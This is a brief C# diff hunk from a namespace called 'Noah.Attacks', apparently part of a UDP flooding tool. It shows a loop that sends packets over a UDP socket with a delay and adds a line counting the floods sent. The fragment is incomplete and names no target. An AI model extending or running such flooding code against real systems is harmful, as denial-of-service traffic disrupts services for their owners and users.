@@ -39,6 +39,7 @@ namespace Noah.Attacks
                 using (Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
                     sock.SendTo(bytes, endPoint);
                 Thread.Sleep(state.Delay);
+                state.FloodCount++;
             }
         }
     }
